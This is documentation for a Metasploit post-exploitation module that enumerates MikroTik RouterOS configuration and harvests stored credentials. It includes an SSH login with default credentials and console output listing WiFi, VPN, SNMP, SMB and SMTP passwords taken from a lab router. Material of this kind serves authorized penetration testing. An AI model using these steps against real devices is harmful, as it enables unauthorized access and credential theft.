## Vulnerable Application

This module has been tested on the following hardware/OS combinations.

* RouterOS 6.45.9 OVA

The image is available from MikroTik [here](https://download.mikrotik.com/routeros/6.45.9/chr-6.45.9.ova)

This module runs the following commands to gather data:

* `/system package print without-paging`
* `/export verbose`

This module will look for the follow parameters which contain credentials:

* `/interface ovpn-client`
* `/interface pppoe-client`
* `/interface l2tp-client`
* `/interface pptp-client`
* `/snmp community`
* `/ppp secret`
* `/ip smb users`
* `/tool e-mail`
* `/interface wireless security-profiles`

## Verification Steps

1. Start msfconsole
2. Get a shell
3. Do: ```use post/networking/gather/enum_mikrotik```
4. Do: ```set session [id]```
5. Do: ```set verbose true```
6. Do: ```run```

## Options

## Scenarios

### RouterOS 6.45.9 OVA Image on ESXi 6.7

```
resource (mikrotik.rb)> use auxiliary/scanner/ssh/ssh_login
resource (mikrotik.rb)> set username admin
username => admin
resource (mikrotik.rb)> set password password
password => password
resource (mikrotik.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (mikrotik.rb)> run
[+] 1.1.1.1:22 - Success: 'admin:password' 'MikroTik CHR 6.45.9 (long-term)'
[*] Command shell session 1 opened (2.2.2.2:41365 -> 1.1.1.1:22) at 2020-07-18 11:06:32 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
resource (mikrotik.rb)> use post/networking/gather/enum_mikrotik
resource (mikrotik.rb)> set session 1
session => 1
resource (mikrotik.rb)> set verbose true
verbose => true
resource (mikrotik.rb)> run
[*] Getting version information
[+] Flags: X - disabled 
 #   NAME                    VERSION                    SCHEDULED              
 0   routeros-x86            6.45.9                                            
 1   system                  6.45.9                                            
 2 X ipv6                    6.45.9                                            
 3   ups                     6.45.9                                            
 4   wireless                6.45.9                                            
 5   hotspot                 6.45.9                                            
 6   mpls                    6.45.9                                            
 7   routing                 6.45.9                                            
 8   ppp                     6.45.9                                            
 9   dhcp                    6.45.9                                            
10   security                6.45.9                                            
11   advanced-tools          6.45.9                                            
12   dude                    6.45.9                                            


[+] Version information stored in to loot /home/h00die/.msf4/loot/20200718121308_default_1.1.1.1_mikrotik.version_923296.txt
[*] Gathering info from /export verbose
[+] 1.1.1.1:22 OS: RouterOS 6.45.9
[+] 1.1.1.1:22 Wireless AP wpawifi with WPA password presharedkey
[+] 1.1.1.1:22 Wireless AP wpa2wifi with WPA2 password presharedkey
[+] 1.1.1.1:22 Wireless AP wpaeapwifi with WPA2-EAP username username password password
[+] 1.1.1.1:22 Wireless AP wepwifi with WEP password 0123456789 with WEP password 0987654321 with WEP password 1234509876 with WEP password 0192837645
[+] 1.1.1.1:22 Wireless AP wep1wifi with WEP password 1111111111
[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out1 with username user and password password
[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out2 with username user and password password
[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out3 with username user and password password
[+] 1.1.1.1:22 disabled Open VPN Client to 10.99.99.98 on mac FE:45:B0:31:4A:34 named ovpn-out4 with username user and password password
[+] 1.1.1.1:22  PPPoE Client on ether2 named pppoe-user and service name internet with username user and password password
[+] 1.1.1.1:22  L2TP Client to 10.99.99.99 named l2tp-hm with username l2tp-hm and password 123
[+] 1.1.1.1:22  PPTP Client to 10.99.99.99 named pptp-hm with username pptp-hm and password 123
[+] 1.1.1.1:22 SNMP community write with password write and write access
[+] 1.1.1.1:22 SNMP community v3 with password 0123456789(SHA1), encryption password 9876543210(AES) and write access
[+] 1.1.1.1:22  SMB Username mtuser and password mtpasswd
[+] 1.1.1.1:22 disabled SMB Username disableduser and password disabledpasswd with RO only access
[+] 1.1.1.1:22 disabled PPP tunnel bridging named ppp1 with profile name ppp_bridge and password password
[+] 1.1.1.1:22 SMTP Username smtpuser and password smtppassword for 1.1.1.1:25
[*] Post module execution completed
```
